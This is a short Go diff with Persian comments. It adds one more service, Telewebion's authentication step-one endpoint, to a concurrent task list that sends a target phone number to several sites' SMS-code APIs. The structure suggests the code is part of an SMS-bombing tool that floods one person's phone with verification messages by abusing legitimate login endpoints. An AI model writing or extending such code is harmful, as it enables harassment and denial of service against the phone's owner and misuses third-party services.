@@ -688,7 +688,19 @@ cookieJar, _ := cookiejar.New(nil)
 
 
 
-
+	// --- اضافه کردن سرویس Telewebion ---
+		wg.Add(1) // برای هر درخواست جدید باید Add(1) رو صدا بزنید
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				// ساختار JSON مورد نیاز سرویس Telewebion
+				payload := map[string]interface{}{
+					"code":      "98",
+					"phone":     getPhoneNumberNoZero(phone), // شماره بدون صفر اول
+					"smsStatus": "default",
+				}
+				sendJSONRequest(c, ctx, "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one", payload, &wg, ch)
+			}
+		}(client)
 		// 1. سرویس zarinplus.com (JSON)
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
